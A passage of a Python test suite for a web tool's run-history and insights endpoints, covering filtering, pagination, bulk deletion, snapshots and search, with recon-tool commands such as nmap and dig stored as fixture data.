            assert data["first_run_date"] == (now - timedelta(days=60)).date().isoformat()
            assert data["windows"]["activity"]["days"] == 61
            assert data["windows"]["command_mix"]["days"] == 90
            assert data["windows"]["constellation"]["days"] == 90
            assert data["windows"]["command_mix"]["sparse"] is True
            assert data["windows"]["constellation"]["sparse"] is True
            assert data["max_day_count"] >= 1
            roots = {item["root"]: item for item in data["command_mix"]}
            assert roots["nmap"]["count"] == 1
            assert roots["nmap"]["succeeded"] == 1
            assert roots["curl"]["failed"] == 1
            assert roots["ping"]["count"] == 1
            assert roots["ping"]["failed"] == 0
            assert roots["whois"]["count"] == 1
            assert any(item["root"] == "nmap" for item in data["constellation"])
            assert data["events"][0]["root"] == "sleep"

            fixed = json.loads(client.get("/history/insights?days=7", headers={"X-Session-ID": session}).data)
            assert fixed["days"] == 28
            assert len(fixed["activity"]) == 28
            assert fixed["windows"]["activity"]["days"] == 28
            assert fixed["windows"]["command_mix"]["days"] == 90
            assert any(item["root"] == "nmap" for item in fixed["command_mix"])
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_insights_falls_back_to_other_when_command_registry_fails(self):
        client = get_client()
        session = "history-insights-category-fallback-" + uuid.uuid4().hex[:8]
        run_id = f"{session}-nmap"
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        run_id,
                        session,
                        "nmap -sT ip.darklab.sh",
                        now.isoformat(),
                        (now + timedelta(seconds=2)).isoformat(),
                        0,
                        "[]",
                        4,
                    ),
                )
                conn.commit()

            with mock.patch("services.commands.registry.load_commands_registry", side_effect=RuntimeError("registry down")):
                data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)

            assert data["command_mix"][0]["root"] == "nmap"
            assert data["command_mix"][0]["category"] == "Other"
            assert data["constellation"][0]["category"] == "Other"
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.commit()

    def test_insights_adaptive_windows_switch_at_command_and_constellation_thresholds(self):
        client = get_client()
        session_25 = "history-insights-window-25-" + uuid.uuid4().hex[:8]
        session_40 = "history-insights-window-40-" + uuid.uuid4().hex[:8]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)

        def insert_runs(conn, session, count):
            for index in range(count):
                started = now - timedelta(days=index % 20, minutes=index)
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        f"{session}-{index}",
                        session,
                        f"nmap -sT 198.51.100.{index % 250}",
                        started.isoformat(),
                        (started + timedelta(seconds=1)).isoformat(),
                        0,
                        "[]",
                        index + 1,
                    ),
                )

        try:
            with sqlite3.connect(DB_PATH) as conn:
                insert_runs(conn, session_25, 25)
                insert_runs(conn, session_40, 40)
                conn.commit()

            data_25 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_25}).data)
            assert data_25["windows"]["command_mix"]["days"] == 30
            assert data_25["windows"]["command_mix"]["total_runs"] == 25
            assert data_25["windows"]["command_mix"]["sparse"] is False
            assert data_25["windows"]["constellation"]["days"] == 90
            assert data_25["windows"]["constellation"]["total_runs"] == 25
            assert data_25["windows"]["constellation"]["sparse"] is True

            data_40 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_40}).data)
            assert data_40["windows"]["command_mix"]["days"] == 30
            assert data_40["windows"]["constellation"]["days"] == 30
            assert data_40["windows"]["constellation"]["total_runs"] == 40
            assert data_40["windows"]["constellation"]["plotted_runs"] == 40
            assert data_40["windows"]["constellation"]["sparse"] is False
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session_25, session_40))
                conn.commit()

    def test_insights_filters_app_builtin_commands(self):
        # The Status Monitor's constellation, treemap, heatmap, events, and
        # max_day_count must all exclude synthetic app built-ins (pwd, whoami,
        # help, ...) so the visualizations reflect real recon work only.
        client = get_client()
        session = "history-insights-builtin-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-pwd",
            f"{session}-whoami",
            f"{session}-help",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_two = (now - timedelta(days=2)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[0], session, "nmap -sT ip.darklab.sh", day_two,
                     (now - timedelta(days=2, seconds=-30)).isoformat(), 0, "[]", 12),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[1], session, "pwd", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[2], session, "whoami", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[3], session, "help", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
                )
                conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            mix_roots = {item["root"] for item in data["command_mix"]}
            constellation_roots = {item["root"] for item in data["constellation"]}
            event_roots = {item["root"] for item in data["events"]}
            assert "nmap" in mix_roots
            assert "nmap" in constellation_roots
            assert "nmap" in event_roots
            for builtin in ("pwd", "whoami", "help"):
                assert builtin not in mix_roots
                assert builtin not in constellation_roots
                assert builtin not in event_roots
            day_two_key = (now - timedelta(days=2)).date().isoformat()
            day_one_key = (now - timedelta(days=1)).date().isoformat()
            day_counts = {entry["date"]: entry["count"] for entry in data["activity"]}
            assert day_counts.get(day_two_key) == 1
            assert day_counts.get(day_one_key, 0) == 0
            assert data["max_day_count"] == 1
            assert data["windows"]["constellation"]["total_runs"] == 1
            assert data["windows"]["constellation"]["plotted_runs"] == 1
            assert data["windows"]["command_mix"]["total_runs"] == 1
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_delete_all_returns_ok(self):
        client = get_client()
        resp = client.delete("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_delete_specific_nonexistent_run_returns_ok(self):
        # Deleting a run_id that doesn't exist should still return ok (idempotent)
        client = get_client()
        resp = client.delete(
            "/history/nonexistent-run-id",
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_bulk_delete_history_reports_partial_results_and_rejects_running_runs(self):
        client = get_client()
        session_id = "bulk-delete-session"
        owned_run_id = "run-" + uuid.uuid4().hex
        incomplete_run_id = "run-" + uuid.uuid4().hex
        running_run_id = "run-" + uuid.uuid4().hex
        other_run_id = "run-" + uuid.uuid4().hex
        missing_run_id = "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code) "
                "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0)",
                (owned_run_id, session_id, "nmap darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (incomplete_run_id, session_id, "curl darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (running_run_id, session_id, "dig darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (other_run_id, "bulk-delete-other", "whois darklab.sh"),
            )
            conn.commit()

        with mock.patch.object(history_routes, "active_runs_for_session", return_value=[{"run_id": running_run_id}]):
            resp = client.post(
                "/history/bulk-delete",
                json={"run_ids": [owned_run_id, incomplete_run_id, running_run_id, other_run_id, missing_run_id]},
                headers={"X-Session-ID": session_id},
            )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["counts"] == {"deleted": 1, "not_found": 2, "rejected": 2}
        assert data["results"] == [
            {"run_id": owned_run_id, "status": "deleted"},
            {"run_id": incomplete_run_id, "status": "rejected", "reason": "incomplete"},
            {"run_id": running_run_id, "status": "rejected", "reason": "running"},
            {"run_id": other_run_id, "status": "not_found"},
            {"run_id": missing_run_id, "status": "not_found"},
        ]
        with sqlite3.connect(DB_PATH) as conn:
            remaining_ids = {
                row[0]
                for row in conn.execute(
                    "SELECT id FROM runs WHERE id IN (?, ?, ?, ?)",
                    (owned_run_id, incomplete_run_id, running_run_id, other_run_id),
                ).fetchall()
            }
        assert remaining_ids == {incomplete_run_id, running_run_id, other_run_id}

    def test_bulk_delete_history_rejects_malformed_ids(self):
        client = get_client()
        session_id = "bulk-delete-malformed"
        overlong_id = "r" * 513

        non_string_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": ["run-ok", 123]},
            headers={"X-Session-ID": session_id},
        )
        assert non_string_resp.status_code == 400
        assert json.loads(non_string_resp.data) == {"error": "run_ids entries must be strings"}

        overlong_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": [overlong_id]},
            headers={"X-Session-ID": session_id},
        )
        assert overlong_resp.status_code == 400
        assert json.loads(overlong_resp.data) == {"error": "run_ids entries are too long", "limit": 512}

        too_many_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": [f"run-{index}" for index in range(101)]},
            headers={"X-Session-ID": session_id},
        )
        assert too_many_resp.status_code == 400
        assert json.loads(too_many_resp.data) == {"error": "too_many", "limit": 100}

    def test_get_run_nonexistent_returns_404(self):
        client = get_client()
        resp = client.get("/history/nonexistent-run-id")
        assert resp.status_code == 404

    def test_history_respects_panel_limit_and_sorts_newest_first(self):
        client = get_client()
        session = "limit-test-session"
        run_ids = ["limit-run-1", "limit-run-2", "limit-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "echo one", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "echo two", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "echo three", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]"),
            )
            conn.commit()
            conn.close()

            with mock.patch.dict("config.CFG", {"history_panel_limit": 2}):
                resp = client.get("/history", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            commands = [r["command"] for r in data["runs"]]

            assert commands == ["echo three", "echo two"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_commands_returns_distinct_recent_commands_without_exit_filter(self):
        client = get_client()
        session = "commands-distinct-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-{i}" for i in range(5)]
        rows = [
            (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", 0),
            (run_ids[1], session, "curl -I https://darklab.sh", "2026-01-01T00:00:02", 7),
            (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:03", 1),
            (run_ids[3], session, "ping darklab.sh", "2026-01-01T00:00:04", 0),
            (run_ids[4], session, "nmap -sV darklab.sh", "2026-01-01T00:00:05", 2),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                [(run_id, sid, cmd, started, started, code, "[]") for run_id, sid, cmd, started, code in rows],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/commands?limit=3",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["commands"] == [
                "nmap -sV darklab.sh",
                "ping darklab.sh",
                "dig darklab.sh A",
            ]
            assert data["limit"] == 3
            assert len(data["runs"]) == 3
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_history_reports_totals_and_keeps_roots_complete_across_pages(self):
        client = get_client()
        session = "pagination-test-session"
        run_ids = ["page-run-1", "page-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -sV darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?page=2&page_size=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["page"] == 2
            assert data["page_size"] == 1
            assert data["total_count"] == 2
            assert data["page_count"] == 2
            assert data["has_prev"] is True
            assert data["has_next"] is False
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["nmap", "dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_applies_starred_only_server_side(self):
        client = get_client()
        session = "starred-filter-session"
        run_ids = ["star-run-1", "star-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "ping darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "dig darklab.sh A", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?starred_only=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["page_count"] == 1
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.execute(
                "DELETE FROM starred_commands WHERE session_id = ? AND command IN (?, ?)",
                (session, "ping darklab.sh", "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

    def test_history_can_return_snapshot_items(self):
        client = get_client()
        session = "snapshot-history-session"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                ("snap-history-1", session, "baseline scan", "2026-01-01T00:00:03", "[]"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'snapshot', ?, 'handoff', ?)",
                ("label-snap-history-1", session, "snap-history-1", "2026-01-01T00:00:04"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'snapshot', ?, 'snapshot note', ?, ?)",
                (
                    "note-snap-history-1",
                    session,
                    "snap-history-1",
                    "2026-01-01T00:00:04",
                    "2026-01-01T00:00:04",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?type=snapshots&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["runs"] == []
            assert data["items"][0]["type"] == "snapshot"
            assert data["items"][0]["label"] == "baseline scan"
            assert data["items"][0]["labels"][0]["label"] == "handoff"
            assert data["items"][0]["note"]["body"] == "snapshot note"
            assert data["items"][0]["label_count"] == 1
            assert data["items"][0]["note_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM entity_labels WHERE entity_id = ?", ("snap-history-1",))
            conn.execute("DELETE FROM entity_notes WHERE entity_id = ?", ("snap-history-1",))
            conn.execute("DELETE FROM snapshots WHERE id = ?", ("snap-history-1",))
            conn.commit()
            conn.close()

    def test_history_filters_run_subtypes(self):
        client = get_client()
        session = "history-run-subtypes-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-builtin", f"{session}-external"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    (
                        run_ids[0],
                        session,
                        "builtin",
                        "project list",
                        "2026-01-01T00:00:01",
                        "2026-01-01T00:00:02",
                        0,
                        "[]",
                    ),
                    (
                        run_ids[1],
                        session,
                        "external",
                        "nmap darklab.sh",
                        "2026-01-01T00:00:03",
                        "2026-01-01T00:00:04",
                        0,
                        "[]",
                    ),
                ],
            )
            conn.commit()
            conn.close()

            builtins = json.loads(client.get(
                "/history?type=runs_builtin&include_total=1",
                headers={"X-Session-ID": session},
            ).data)
            external = json.loads(client.get(
                "/history?type=runs_external&include_total=1",
                headers={"X-Session-ID": session},
            ).data)

            assert [item["id"] for item in builtins["items"]] == [run_ids[0]]
            assert builtins["items"][0]["run_kind"] == "builtin"
            assert builtins["total_count"] == 1
            assert [item["id"] for item in external["items"]] == [run_ids[1]]
            assert external["items"][0]["run_kind"] == "external"
            assert external["total_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_runs_by_project_and_ignores_legacy_snapshot_links(self):
        client = get_client()
        session = "project-history-" + uuid.uuid4().hex[:8]
        project_resp = client.post(
            "/projects",
            json={"name": "History Project"},
            headers={"X-Session-ID": session},
        )
        project = json.loads(project_resp.data)["project"]
        linked_run = f"{session}-run-linked"
        other_run = f"{session}-run-other"
        linked_snapshot = f"{session}-snapshot-linked"
        other_snapshot = f"{session}-snapshot-other"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                [
                    (linked_run, session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
                    (other_run, session, "nmap darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
                ],
            )
            conn.executemany(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                [
                    (linked_snapshot, session, "linked snapshot", "2026-01-01T00:00:05", "[]"),
                    (other_snapshot, session, "other snapshot", "2026-01-01T00:00:06", "[]"),
                ],
            )
            conn.executemany(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, ?, ?, ?, datetime('now'))",
                [
                    (f"{session}-link-run", project["id"], "run", linked_run, "manual"),
                    (f"{session}-link-snapshot", project["id"], "snapshot", linked_snapshot, "migration"),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                f"/history?project_id={project['id']}&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert [item["id"] for item in data["items"]] == [linked_run]
            assert [run["id"] for run in data["runs"]] == [linked_run]
            assert data["roots"] == ["dig"]
            assert data["items"][0]["project_link_count"] == 1
            assert data["items"][0]["project_links"][0]["project_id"] == project["id"]
            assert data["items"][0]["project_links"][0]["project"]["name"] == "History Project"
            assert data["runs"][0]["project_link_count"] == 1
            assert data["runs"][0]["project_links"][0]["project_id"] == project["id"]

            snapshots_resp = client.get(
                f"/history?type=snapshots&project_id={project['id']}&include_total=1",
                headers={"X-Session-ID": session},
            )
            snapshots = json.loads(snapshots_resp.data)
            assert snapshots["total_count"] == 0
            assert snapshots["items"] == []
            assert snapshots["runs"] == []
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_history_search_filters_by_command_text(self):
        client = get_client()
        session = "history-search-session"
        run_ids = ["search-run-1", "search-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "artifact-search-run-1",
                    session,
                    run_ids[0],
                    "darklab/findings.txt",
                    "findings.txt",
                    "output",
                    42,
                    "workspace_flag",
                    "2026-01-01T00:00:02",
                ),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'answer found', 'darklab.sh has address 104.21.4.35', 0, ?, ?)",
                ("finding-search-run-1", session, run_ids[0], "fp-search-run-1", "2026-01-01T00:00:02"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'run', ?, 'baseline', ?)",
                ("label-search-run-1", session, run_ids[0], "2026-01-01T00:00:02"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'run', ?, 'review note', ?, ?)",
                (
                    "note-search-run-1",
                    session,
                    run_ids[0],
                    "2026-01-01T00:00:02",
                    "2026-01-01T00:00:02",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "ping darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?q=dig", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["runs"][0]["artifact_count"] == 1
            assert data["runs"][0]["artifacts"][0]["workspace_path"] == "darklab/findings.txt"
            assert data["runs"][0]["finding_count"] == 1
            assert data["runs"][0]["label_count"] == 1
            assert data["runs"][0]["note_count"] == 1
            assert data["runs"][0]["labels"][0]["label"] == "baseline"
            assert data["runs"][0]["note"]["body"] == "review note"
            assert data["items"][0]["artifact_count"] == 1
            assert data["items"][0]["finding_count"] == 1
            assert data["items"][0]["label_count"] == 1
            assert data["items"][0]["note_count"] == 1
            assert data["items"][0]["labels"][0]["label"] == "baseline"
            assert data["items"][0]["note"]["body"] == "review note"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM run_file_artifacts WHERE run_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM findings WHERE run_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM entity_labels WHERE entity_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM entity_notes WHERE entity_id = ?", (run_ids[0],))
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_command_scope_excludes_output_matches(self):
        client = get_client()
        session = "history-command-scope-session"
        run_ids = ["command-scope-1", "command-scope-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[0],
                    session,
                    "file list",
                    "2026-01-01T00:00:01",
                    "2026-01-01T00:00:02",
                    0,
                    "[]",
                    "amass results.txt",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "amass enum -d darklab.sh",
                    "2026-01-01T00:00:03",
                    "2026-01-01T00:00:04",
                    0,
                    "[]",
                    "",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?type=runs&scope=command&q=amass", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["amass enum -d darklab.sh"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_command_root(self):
        client = get_client()
        session = "history-root-session"
        run_ids = ["root-run-1", "root-run-2", "root-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sV darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -Pn darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]", 0),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]", 1),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?command_root=nmap", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["nmap -Pn darklab.sh", "nmap -sV darklab.sh"]
            assert data["roots"] == ["nmap"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_exit_code_and_recent_date_range(self):
        client = get_client()
        session = "history-date-session"
        run_ids = ["date-run-1", "date-run-2", "date-run-3", "date-run-4"]
        recent = datetime.now().replace(microsecond=0)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "curl recent ok", recent.isoformat(), (recent + timedelta(seconds=2)).isoformat(), 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "curl recent fail",
                    (recent - timedelta(hours=1)).isoformat(),
                    (recent - timedelta(hours=1) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[2],
                    session,
                    "curl old fail",
                    (recent - timedelta(days=40)).isoformat(),
                    (recent - timedelta(days=40) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[3],
                    session,
                    "ping stopped",
                    (recent - timedelta(minutes=30)).isoformat(),
                    (recent - timedelta(minutes=30) + timedelta(seconds=2)).isoformat(),
                    -15,
                    "[]",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?exit_code=nonzero&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
